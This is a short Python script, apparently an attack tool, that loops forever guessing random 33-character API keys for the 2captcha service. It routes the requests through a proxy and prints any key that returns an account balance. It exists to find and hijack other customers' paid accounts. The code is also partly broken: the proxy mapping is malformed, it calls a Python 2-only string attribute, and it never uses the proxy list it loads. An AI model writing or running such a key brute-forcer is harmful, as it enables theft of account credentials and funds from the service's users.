import requests
import random
import string
#proxies = {"https://2captcha.com/":}
#r = requests.get("", proxies=proxies)
#print(r.text)
a = open('proxylist.txt', 'r').readlines()
file = [ s.rstrip() for s in a ]
while True:
	proxies = {"https://2captcha.com/":"190.96.91.243:8080"}
	letters = string.digits + string.lowercase
	randomString =  ''.join(random.choice(letters) for i in range(33)) 

	r = requests.get("https://2captcha.com/res.php?key=" + randomString + "&action=getbalance", proxies=proxies)
	if "." in r.text:
		print("Work ID : " + randomString + "Balance: " + r.text)
	else:
		print("Not Work ID : " + randomString + " " + r.text)